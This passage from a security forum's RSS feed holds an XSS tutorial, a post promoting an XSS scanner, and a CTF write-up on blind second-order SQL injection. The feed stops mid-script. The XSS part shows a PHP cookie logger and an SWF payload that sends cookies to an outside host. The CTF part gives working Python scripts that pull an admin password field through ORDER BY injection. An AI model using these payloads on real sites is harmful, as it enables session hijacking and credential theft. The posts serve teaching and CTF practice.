            exit;  
        }  
        if (fwrite($handle, $cookie) === FALSE) {  
            echo "Cannot write to file ($filename)";  
            exit;  
        }  
        echo "Success, wrote the information to the log file";  
        fclose($handle);  
    } else {  
        echo "The file is not writable";  
    }  
?&gt;  
</code></pre>
<p>After a cookie is obtained, the attacker can use an application that is capable of sending http requests to hijack the corresponding user’s session. Three available applications for sending http requests are Firefox (Using the LivehttpHeaders Extension), Proxomitron, and BurpSuite. I will explain how to do this with two of the mentioned applications.</p>
<p><em>Instructions for Cookie Alteration in Firefox with LiveHttpHeaders</em></p>
<ol>
<li>Install the LivehttpHeaders extension and restart your browser.</li>
<li>Click Tools&gt;&gt;LivehttpHeaders and visit the website that you got the cookie from</li>
<li>Highlight the main script request and click the replay button</li>
<li>Replace the current cookie information with your cached information. (Cookie:)</li>
</ol>
<h2>Inducing User Actions</h2>
<p>Although session hijacking accounts for the majority of First Order XSS Attack scenarios on the web, it is not always the most efficient attack type.</p>
<p>Inducing user actions through Request Forgery is an alternative to session hijacking, frequently utilized by attackers when stealth in an emphasized concern. Request Forgery allows an attacker to completely bypass authentication mechanisms, exploiting an active client/server trust relationship to cause a user to carry out malicious actions via the target application. In summation, this attack type establishes a proxy-like relationship between the attacker and the user.</p>
<h2>Prevention</h2>
<p>Prevention methods for Cross Site Scripting have been under development since the discovery of the attack; however, that development has yielded little success until recent years. The most successful approach to-date used to prevent XSS is as follows:</p>
<ol>
<li>Choose a target application.</li>
<li>Isolate every function within the application by which user-controlled data is returned in the application’s response.</li>
<li>Validate all user supplied input by ensuring that all submitted data contains only permitted characters, and that the length of the data meets set requirements. A combination of these two methods and other preventative validations is most effective because it requires that the submitted data conforms to an established standard.</li>
<li>Sanitize all application returned output by encoding all data that could be hazardous when displayed to users if left untouched. Encoding, or completely removing, all non-alphanumeric characters is the most reliable approach to sanitization.</li>
<li>Repeat steps one through four to secure other web applications on the web site.</li>
</ol>
<h1>Second Order</h1>
<p>This vulnerability arises when data is submitted to a web application by a user, then stored persistently on the server (typically in a back-end database or file system), and later displayed to other users on a web page without being properly filtered or sanitized.</p>
<p>Because second order XSS attacks involve specifically crafted malicious code that is first stored on the server, and then displayed to other users, the attack script is rendered more than once, enabling an attacker to affect multiple users with very little effort.</p>
<h2>Discovery</h2>
<p>The process of detecting second order XSS vulnerabilities is similar to the method discussed in the previous sections, which address the detection of First Order XSS vulnerabilities; however, in order to maximize the number of vulnerabilities identified, further investigation must be done.</p>
<ol>
<li>Follow the steps in section 0x211. Monitor the application’s responses for instances in which the submitted data is stored persistently on the server and then returned to the browser.</li>
<li>Check file upload, file transfer, and file creation scripts for vulnerabilities. Frequently, these types of applications do not contain functions to validate and sanitize file contents, leaving them open to a wide array of attacks.</li>
<li>Check scripts that handle statistics and error logs to see if manipulating their output is possible.</li>
<li>Use XSS in combination with other computer security exploits to check for other avenues of attack.</li>
<li>Check everything else! Twice!</li>
</ol>
<h2>Exploitation</h2>
<p>The purpose of this sub-section is to provide an aid in understanding Cross Site Scripting exploitation through real-world examples of XSS attacks. Each of the examples below is designed to emulate a commonly encountered attack scenario on the web.</p>
<h2>XSS Virii</h2>
<p>As mentioned previously within this document, First Order XSS Request Forgery allows an attacker to leverage a Cross Site Scripting attack payload to cause a user to issue requests against a target application; however, the non-persistent nature of First Order XSS leaves the most potentially devastating implications of this attack type completely untapped.</p>
<p>One of the major drawbacks of the First Order version of this attack is that the introduced attack payload is delivered and executed by means of a single request and response, affecting a maximum of one user at a time. Second Order Request Forgery XSS harnesses the power to manipulate the actions of, potentially, an unlimited amount of users in an exponentiallydamaging, proxy-chain-like array of requests to a vulnerable web application.</p>
<h3>Example No. One</h3>
<p>The Samy worm was a self-propagating cross-site scripting worm developed to propagate across the MySpace social-networking site. The worm was released on October 4, 2005, and in less than 20 hours, infected over one million MySpace users.</p>
<p>The process of how the Samy worm worked, according to its creator, is as follows:</p>
<ul>
<li>A maliciously crafted JavaScript code was first placed in the profile of a single user - in this case, Samy was that user.</li>
<li>Upon viewing the MySpace profile that contains the worm, the malicious code was automatically executed. The code would edit the profile of all viewing users, adding Samy as a friend and appending him as a hero. The method used to do this required multiple<br>
requests (GETs and POSTs) to the server via Asynchronous JavaScript and XML (Ajax). By running these background requests, the script was able to completely bypass the need for user actions (User Requests, Confirmations, etc.).</li>
<li>The most dangerous attribute of the code is that it was self-replicating. Upon execution of the code, it was copied and assigned to its own variable, obfuscated to avoid filters, and then sent as its own request to the server. The issued request would trigger the server to<br>
add the script to the profile of the viewing user(s).</li>
<li>The entire process would start over whenever the profiles of the newly infected users were viewed.</li>
</ul>
<p>The Samy virus became one of the fastest spreading viruses of all time, and Samy became one of the most popular MySpace users of all time. The spreading of the virus was so rapid that it actually created a denial-of-service attack, because of the exponential growth of the Samy’s friends list.</p>
<h2>Bugging File Handlers</h2>
<p>Frequently, file handling application do not contain functions to validate and sanitize file contents, leaving them defenseless against Second Order XSS.</p>
<p>This type of attack differs from all of the attacks previously mentioned in that malicious code is not injected directly into a web page; instead, the attack is launched via a separate file that contains malicious code, which is introduced by an attacker.</p>
<h3>Example No. One</h3>
<p>Target: <a href="http://www.fakeelectronicart.com" rel="nofollow noopener">http://www.fakeelectronicart.com</a><br>
Intention: Financial Gain</p>
<p>An attacker submitted a piece of art, created using an SWF design tool, to the Fake Electronic Art website. The site allows users to display their art as well as auction it off. The art that the attacker submitted contains the following script, which runs undetected in the background:</p>
<pre><code class="lang-auto">getURL("javascript:location='http://www.externalhost.com/cookielogger.php?  
cookie='+document.cookie")  
</code></pre>
<p>This script sends user session data to a script on a remote server. The external script would then write the data to a log file for later use.</p>
<h2>Prevention</h2>
<p>Prevention methods for Second Order XSS are more complex than those of the First Order category because Second Order attack vectors are more diverse; however, the fundamental defensive measures are the same. To prevent Second Order XSS, try the following:</p>
<ol>
<li>Be sure to validate user supplied data and to sanitize application responses that correspond to items that are stored persistently on the server.</li>
<li>Check file upload, file transfer, and file creation scripts for vulnerabilities. If vulnerabilities exist, validate file headers and footers of permitted file types.</li>
<li>Validate HTTP headers</li>
<li>Sanitize all log files by purging hazardous characters.</li>
<li>Check everything else! Twice!</li>
</ol>
<p>Hope you learned something from this article!</p>
            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/practical-applications-of-xss/18699">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/practical-applications-of-xss/18699</link>
          <pubDate>Mon, 20 Jan 2020 15:55:07 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-18699</guid>
          <source url="https://0x00sec.org/t/practical-applications-of-xss/18699.rss">Practical Applications of XSS</source>
        </item>
        <item>
          <title>A powerful xss scanner for scanning many urls</title>
          <dc:creator><![CDATA[lwzSoviet]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/lwzSoviet/NoXss" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="/uploads/default/original/2X/3/3e00abbf188a8801fa8b01aa4785172a78395c35.png" class="thumbnail onebox-avatar" width="400" height="400">

<h3><a href="https://github.com/lwzSoviet/NoXss" target="_blank" rel="noopener nofollow ugc">lwzSoviet/NoXss</a></h3>

<p>Faster xss scanner,support  reflected-xss and dom-xss - lwzSoviet/NoXss</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<h1>0x01Why I make this tool?</h1>
<p>I’m working in a electronic commerce company as information security engineer, I need analyse risk in logs from online system. Log’s size is always more than TB. It’s hard to find vulnerability manually. So we  develope our tools for scanning work every day.</p>
<h1>0x02 What’s “NoXss”?</h1>
<p>“NoXss” is a plugin  of our Web Scanner named Tiamat, a powerful xss scanner . It’s really faster  and suitable for scanning big data.  We have used it to find 300+ xss rencently.</p>
<ul>
<li>It used only 5 payloads based param’s position to find xss risk rather than fuzzing. Fuzzing is open slowly and blind.</li>
<li>Phantomjs &amp; Chrome are used in this tool. That means it supports DOM based xss. We can open 4 or more browsers to work together, means faster.</li>
<li>Analysis. NoXss will create save many files for helping to analyse xss for users because some xss is diffcult to scan,such as Multiparted form request, WAF’s deny, 302 redirect, etc.</li>
<li>Work with Burpsuite.  User can export their traffic data from Burpsuite to **.xml, then scan it. This is really a good function.</li>
<li>Support some headers like Cookie, Referer, Token or others,  this tool will add it automatically. So you don’t worry the logined state or some header’s check in backend.</li>
<li>NoXss is highly concurrent for using coroutine(Gevent).</li>
</ul>
<h1>0x03 Some result we have found</h1>
<p>In fact, NoXss find lots of xss every day. Following are some example:<br>
Sorry these examples are not allowed to open by 0x00sec’s admin.</p>
<h1>0x04 How to use it?</h1>
<p>See details in <a href="https://github.com/lwzSoviet/NoXss" rel="noopener nofollow ugc">https://github.com/lwzSoviet/NoXss</a>. We have a release at <a href="https://github.com/lwzSoviet/NoXss/releases/tag/v1.0-beta" rel="noopener nofollow ugc">https://github.com/lwzSoviet/NoXss/releases/tag/v1.0-beta</a></p>
<h1>0x05 Our Plan</h1>
<p>We  decide to open this plugin at <a href="https://github.com/lwzSoviet/NoXss" rel="noopener nofollow ugc">https://github.com/lwzSoviet/NoXss</a> firstly. The whole scanner “Tiamat” need more better plugins like command injection, ssrf, etc. We will open it in a few time.<br>
Using “NoXss” and give me some advice or issues if you have interest in it.</p>
<p><em>Don’t forget to Star it if it’s helpful to you</em><img src="https://0x00sec.org/images/emoji/twitter/v.png?v=9" title=":v:" class="emoji only-emoji" alt=":v:"></p>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/a-powerful-xss-scanner-for-scanning-many-urls/18225">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/a-powerful-xss-scanner-for-scanning-many-urls/18225</link>
          <pubDate>Mon, 23 Dec 2019 03:01:34 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-18225</guid>
          <source url="https://0x00sec.org/t/a-powerful-xss-scanner-for-scanning-many-urls/18225.rss">A powerful xss scanner for scanning many urls</source>
        </item>
        <item>
          <title>Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</title>
          <dc:creator><![CDATA[chivato]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Recently we had our first edition of the TMHC CTF Competition, and one of the challenges was called Shitter (a play on twitter). The challenge was based on a special case of SQL injection, and I thought it would be a good development topic for a post on the 0x00sec forums. I have included the intended method of exploitation, and some others that I found interesting, that may be useful in situations of bug bounties or pentests.</p>
<p><strong>Introduction</strong><br>
Let me start by saying that this article assumes that you understand the fundamentals of SQL Injection, and you are comfortable with exploiting basic SQL Vulnerabilities.</p>
<p>If you have ever looked into the topic in depth enough, you will have realized that depending on where the injection point is in the query, the limitations may vary, and the difficulty of exploitation may increase.</p>
<p>In this post I will be talking about some of the independent research I have undergone over the past week, relating to Blind Second Order SQL Injections in ORDER BY clauses.</p>
<p>I am going to individually explain the parts of this vulnerability, and then demonstrate how I was able to develop a solution for each individual problem that Blind Second Order SQL Injections may present.</p>
<p><strong>Blind SQL Injection</strong>:<br>
<em>Explanation</em><br>
Blind SQL Injections are any SQL Injections where direct database output is not offered, so you are essentially trying to leak data “blindly”. An example of this could be a logging system, where they insert the logs into a table, and you never see the logs, or the commands output. A basic solution for this would be using the sleep() function that most, if not all DBMS’ have.</p>
<p><em>Explanation of solution</em><br>
The sleep function causes the DBMS to not respond for a set amount of time, meaning that you can convert your query into some sort of a boolean query so the output is true or false, and if it is true, then make the DBMS sleep, due to the DBMS sleeping, the server response time will be longer, and you will be able to tell what the boolean SQL queries output was.</p>
<p><em>Example boolean sleep SQL Query</em><br>
<code>IF ([CONDITION]) THEN sleep(3); ELSE sleep(0); END IF; END;</code></p>
<p>In the example above, it checks whether the condition is true or false, and then depending on the conditions output, it will either sleep for 3 seconds, or 0 seconds.</p>
<p>Although, in our situation, instead of using sleep, we will be making the post order either be alphabetically ordered title or alphabetically ordered contents, so we can create a post called “A” with “Z” as the contents, and another post called “Z” with “A” as the contents.</p>
<p><strong>Second Order SQL Injection</strong>:<br>
<em>Explanation</em><br>
For the people who may not have heard of Second Order SQL Injections, here is a perfect explanation pulled directly from <a href="https://portswigger.net/kb/issues/00100210_sql-injection-second-order" rel="noopener nofollow ugc">https://portswigger.net/kb/issues/00100210_sql-injection-second-order</a></p>
<blockquote>
<p>Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. To detect the vulnerability, it is normally necessary to submit suitable data in one location, and then use some other application function that processes the data in an unsafe way.</p>
</blockquote>
<p>Due to second order SQL Injections not taking user input directly from the user, but instead storing it in another part of the database or backed (it could be stored in a cookie), it is generally harder to recognize and find in larger applications.</p>
<p><strong>Injection point being the ORDER BY clause</strong>:<br>
<em>Explanation</em><br>
SQL Query syntax is extremely specific, and not flexible enough for the usual SQL Injection payloads that make use of UNION to append data onto what the database already responds with.</p>
<p><em>Explanation of solution</em><br>
After some research, I came to the conclusion* that if the injection point is directly after the ORDER BY clause (for example: <code>SELECT * FROM users WHERE name = "test" ORDER BY USER-INPUT;</code>) then you can make use of the CASE clause that exists in certain DBMS’, for my research I used MySQL as the DBMS of choice.</p>
<p>The technique I have managed to come up with for this explicit situation looks something like this:<br>
<code>(SELECT (CASE WHEN EXISTS(SELECT [column] FROM [table] WHERE [column] REGEXP "^.*" AND [FURTHER CONDITIONS]) THEN [One column name] ELSE [Another column name] END));</code></p>
<p>Here are some examples of testing this query on MySQL directly:</p>
<pre><code class="lang-auto">MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 1 ORDER BY (SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP "^.*") THEN post_
creation_time ELSE post_content END));
+---------------+---------------------------------------------------+---------------------+
| post_title    | post_content                                      | post_creation_time  |
+---------------+---------------------------------------------------+---------------------+
| From: chivato | Welcome to shitter! Visit /create to get started! | 2019-11-29 15:10:02 |
| test          | tteetteet                                         | 2019-11-29 15:10:15 |
+---------------+---------------------------------------------------+---------------------+
2 rows in set (0.00 sec)

MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 1 ORDER BY (SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP "^x.*") THEN post
_creation_time ELSE post_content END));
+---------------+---------------------------------------------------+---------------------+
| post_title    | post_content                                      | post_creation_time  |
+---------------+---------------------------------------------------+---------------------+
| test          | tteetteet                                         | 2019-11-29 15:10:15 |
| From: chivato | Welcome to shitter! Visit /create to get started! | 2019-11-29 15:10:02 |
+---------------+---------------------------------------------------+---------------------+
2 rows in set (0.00 sec)
</code></pre>
<p>As demonstrated above, when the regex that the password is compared to returns true, the posts are ordered by the post title (F is before t in the alphabet, so <code>From: chivato</code> is displayed before the <code>test</code> post). The opposite can also be seen in the next query, where the regex now checks if the password field entry starts with “x” (this has to be false since I am using md5 to hash my passwords, and there will never be an x in an md5 hash due to the hex encoding), due to this query being false, the posts are now ordered by post contents (t is before W in the alphabet, so the posts that have content starting with <code>t</code> are displayed before the ones that have contents starting with <code>W</code>).</p>
<p><strong>Breakdown</strong>:<br>
Now let’s break this query down, and explain each separate part of it, to facilitate the visualization of the situation / back-end processing, I have developed a vulnerable social media app (the Shitter webapp used in the CTF), where a user can create a post and then change the order of these posts (this is the injection point) in settings, where the order selected is inserted into the user’s server signed cookie, the contents of the “order” value in the cookie are then placed directly into a SQL query (inside the ORDER BY clause), finall being executed when the posts are being taken from the database (when a profile is being loaded up).</p>
<p>So, the initial SELECT() inserts the internal queries output into the end of the query, inside that parentesis, we have an EXIST(SELECT…), this exist converts the query to a boolean query, since it makes it so that, if there is an output for the select query in the center of the nested query, then the exist will output 1, if not, it will return 0, 1 being true, 0 being false.</p>
<p>This is where the CASE part comes in, if the EXIST part of the statement responds with 1, then the case will order by the first column specified, if not, it will order by the second column specified, so you can go to the page used to trigger the second order SQLi, and depending on the output order of the posts, you will know if the EXISTS returned 0 or 1.</p>
<p>Finally, the inside of the EXISTS() function is a normal query, that uses a REGEXP to bruteforce one character at a time (if it is a hash, then you only need a-f and 0-9, due to hex encoding on the ‘mainstream’ hashes). In our case we want to leak a flag, so I have developed the following script that bruteforces the REGEXP character by character using a set dictionary of basic alhpanumeric chars (a-zA-Z0-9).</p>
<p>Essentially, instead of using the sleep function (which would be much slower and would not work due to the situation of the injection point), we make use of the fact that we have control over the ORDER BY clause, and use this as our true / false identifier instead of the response time of the server.</p>
<p><strong>Shitter solution</strong>:</p>
<p>Upon finding the injection point we see “post_creation_time asc”, which could only fit in the ORDER BY clause of a SQL Query, so we know where our injection is being inserted into, let’s see if it is vulnerable.</p>
<p>So we send the request to update the post order and add a <code>'</code> on the end:<br>
<img src="/uploads/default/original/2X/e/ecf2d67eab1f6fefcd075b177f3ffa943c8fd99c.png" alt="" data-base62-sha1="xO8XzaRYSW2CCY6JFxw6S899yhK" width="690" height="315"></p>
<p>Now we try and trigger the SQL Query by loading a users posts:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d.png" data-download-href="/uploads/short-url/bWplXF2cdFb4Jvxj0i7bplQAzql.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_690x353.png" alt="" data-base62-sha1="bWplXF2cdFb4Jvxj0i7bplQAzql" width="690" height="353" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_690x353.png, https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_1035x529.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_1380x706.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_10x10.png"></a></div><p></p>
<p>Perfect, we get a sql error due to the unterminated string (this is due to the standalone <code>'</code>).</p>
<p>Now we can get to the actual injection, we know we control anything after the ORDER BY clause, so we control the posts order, I wonder if there is a way of using IF statements in MySQL, initially I came across this: <a href="http://www.mysqltutorial.org/mysql-if-statement/" rel="noopener nofollow ugc">http://www.mysqltutorial.org/mysql-if-statement/</a>, although I was not able to get this to work, I believe this is due to the IF statement needing to either be at the start of the query, or in a set SQL procedure.</p>
<p>Then I remembered there being a similar “CASE” (<a href="https://www.w3schools.com/sql/func_mysql_case.asp" rel="noopener nofollow ugc">https://www.w3schools.com/sql/func_mysql_case.asp</a>) clause in MySQL that has a very similar functionality, if not identical to IF statements, which can be placed anywhere in a SQL query, so I tried it in my make-shift shitter database and boom! It works (after a while of fiddling with the statement).</p>
<pre><code class="lang-auto">MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 2 ORDER BY (SELECT (CASE WHEN (1=1) THEN post_creation_time ELSE post_content END));
+------------+--------------+---------------------+
| post_title | post_content | post_creation_time  |
+------------+--------------+---------------------+
| A          | Z            | 2019-12-17 13:21:20 |
| Z          | A            | 2019-12-17 13:21:25 |
+------------+--------------+---------------------+
2 rows in set (0.02 sec)

MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 2 ORDER BY (SELECT (CASE WHEN (1=2) THEN post_creation_time ELSE post_content END));
+------------+--------------+---------------------+
| post_title | post_content | post_creation_time  |
+------------+--------------+---------------------+
| Z          | A            | 2019-12-17 13:21:25 |
| A          | Z            | 2019-12-17 13:21:20 |
+------------+--------------+---------------------+
2 rows in set (0.01 sec)

MariaDB [shitter]&gt;
</code></pre>
<p>So we now have a working injection, let’s try it on shitter, first we make the condition true:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217.png" data-download-href="/uploads/short-url/zqKOBMoQBxSDZpjH0TVDAmxueZV.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217_2_690x279.png" alt="" data-base62-sha1="zqKOBMoQBxSDZpjH0TVDAmxueZV" width="690" height="279" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217_2_690x279.png, /uploads/default/original/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217.png 1.5x, /uploads/default/original/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217_2_10x10.png"></a></div><br>
And we trigger the SQL Injection:<br>
<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/1/195964c4ce0cf659cb328e691c40aad1f98b27b3.png" data-download-href="/uploads/short-url/3CfsCSdmhre230NkkOa6m0lkFbR.png?dl=1" title=""><img src="/uploads/default/original/2X/1/195964c4ce0cf659cb328e691c40aad1f98b27b3.png" alt="" data-base62-sha1="3CfsCSdmhre230NkkOa6m0lkFbR" width="690" height="401" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/195964c4ce0cf659cb328e691c40aad1f98b27b3_2_10x10.png"></a></div><br>
Cool, so the posts were ordered by the post_title, and not the contents.<p></p>
<p>Now let’s demonstrate the other way around:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9.png" data-download-href="/uploads/short-url/gFY8Dg4sgaYBxAovTfpk5WyFCPL.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9_2_690x178.png" alt="" data-base62-sha1="gFY8Dg4sgaYBxAovTfpk5WyFCPL" width="690" height="178" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9_2_690x178.png, /uploads/default/original/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9.png 1.5x, /uploads/default/original/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9_2_10x10.png"></a></div><br>
<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/3/37128434fc6d6d39f00741947c922f2c9b57f2a6.png" data-download-href="/uploads/short-url/7RbVNbzdWX7LWqUNlcPb2qxkjBQ.png?dl=1" title=""><img src="/uploads/default/original/2X/3/37128434fc6d6d39f00741947c922f2c9b57f2a6.png" alt="" data-base62-sha1="7RbVNbzdWX7LWqUNlcPb2qxkjBQ" width="690" height="379" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/37128434fc6d6d39f00741947c922f2c9b57f2a6_2_10x10.png"></a></div><p></p>
<p>We have confirmed that depending on whether the output of the statement is 0 or 1, the post will either be ordered by title, or contents. We can combine this idea with EXISTS() (<a href="https://dev.mysql.com/doc/refman/8.0/en/exists-and-not-exists-subqueries.html" rel="noopener nofollow ugc">https://dev.mysql.com/doc/refman/8.0/en/exists-and-not-exists-subqueries.html</a>) and REGEXP (<a href="https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php" rel="noopener nofollow ugc">https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php</a>) to slowly leak the contents of the admin password field.</p>
<p>I developed a short script to automate this:</p>
<pre><code class="lang-python">import requests, time

s = requests.Session()
dictionary = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','0','_','{','}']
URL = "http://gusralph.info:5000"
username = "demo"
password = "demo"
data = {'name' : username, 'password' : password}
r = s.post(url = URL + "/login", data = data)
final = ""

while True:
        data = {'order' : 'post_creation_time ASC'}
        r = s.post(url = URL + "/settings", data = data)
        for x in dictionary:
                data = {'order' : '(SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP "^' + str(final) + x + '.*" AND name = "admin") THEN post_content ELSE post_creation_time END)); -- -'}
                r = s.post(url = URL + "/settings", data = data)
                out = s.get(url = URL + "/profile/2")
                if out.text.find('aaaaaaasdsd') &lt; out.text.find('ZZZZ'):
                        final += x
                        print "Leaking contents of admin hash: " + final
                        break
                else:
                        pass
</code></pre>
<p>This script manages to leak the contents of the admin password field:</p>
<pre><code class="lang-auto">chiv@Dungeon:~$ python solver.py
Leaking contents of admin hash: t
Leaking contents of admin hash: tm
Leaking contents of admin hash: tmh
Leaking contents of admin hash: tmhc
Leaking contents of admin hash: tmhc{
Leaking contents of admin hash: tmhc{b
Leaking contents of admin hash: tmhc{bl
Leaking contents of admin hash: tmhc{bl1
[...]
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinje
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjec
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinject
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0n
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0n}
</code></pre>
<p>Although, the MySQL REGEXP function is not case sensitive (<a href="https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php" rel="noopener nofollow ugc">https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php</a>), so I added the <code>BINARY</code> function after the REGEXP to create the final script:</p>
<pre><code class="lang-python">import requests, time

s = requests.Session()
dictionary = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','0','_','{','}']
URL = "http://gusralph.info:5000"
username = "demo"
password = "demo"
data = {'name' : username, 'password' : password}
r = s.post(url = URL + "/login", data = data)
final = ""

while True:
        data = {'order' : 'post_creation_time ASC'}
        r = s.post(url = URL + "/settings", data = data)
        for x in dictionary:
                data = {'order' : '(SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP BINARY "^' + str(final) + x + '.*" AND name = "admin") THEN post_content ELSE post_creation_time END)); -- -'}
                r = s.post(url = URL + "/settings", data = data)
                out = s.get(url = URL + "/profile/2")
                if out.text.find('aaaaaaasdsd') &lt; out.text.find('ZZZZ'):
                        final += x
                        print "Leaking contents of admin hash: " + final
                        break
                else:
                        pass
</code></pre>
<p>With the final result being:</p>
<pre><code class="lang-auto">chiv@Dungeon:~$ python solver.py
Leaking contents of admin hash: T
Leaking contents of admin hash: TM
Leaking contents of admin hash: TMH
Leaking contents of admin hash: TMHC
Leaking contents of admin hash: TMHC{
Leaking contents of admin hash: TMHC{B
[..]
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJect
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0n
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0n}
</code></pre>
<p><strong>Unintended methods of solving Shitter</strong>:<br>
<em>Alternative (kudos to Morph3 (<a href="https://twitter.com/melihkaanyldz" rel="noopener nofollow ugc">https://twitter.com/melihkaanyldz</a>))</em>:<br>
In the CTF I forgot to add a try: except: into the script to handle the python errors, which can sometimes be overly verbose. If I had added the try and except it would have just redirected to a /error page. Due to the overly verbose error messages, and the flask debug being set to True in my script, there was a certain payload that could be used, that caused the flask error message to actually display the queries output.</p>
<p>An example of what the output would look like is:</p>
<pre><code class="lang-auto">  File "/home/chivato/.local/lib/python2.7/site-packages/pymysql/protocol.py", line 220, in check_error
    err.raise_mysql_exception(self._data)
  File "/home/chivato/.local/lib/python2.7/site-packages/pymysql/err.py", line 109, in raise_mysql_exception
    raise errorclass(errno, errval)
InternalError: (1105, u"XPATH syntax error: '\nTMHC{Bl1nDSQlS3c0ndorderINJecti'")

--&gt;
</code></pre>
<p>The query that breaks the challenge being:<br>
<code>1,extractvalue(0x0a,concat(0x0a,([SQL QUERY HERE])))#</code></p>
<p>Here is a script he developed to automate the process:</p>
<pre><code class="lang-python">import requests

s = requests.Session()

url = "URL:PORT/"
data = {
    "name":"USERNAME",
    "password":"PASSWORD"
}

r = s.post(url+"login",data=data)

q = "select database()"

while q != "q":
    data = {
         "order" : "1,extractvalue(0x0a,concat(0x0a,({})))#".format(q)
    }
    r = s.post(url+"settings",data=data)
    r = s.get(url+"profile/1")
    print r.text
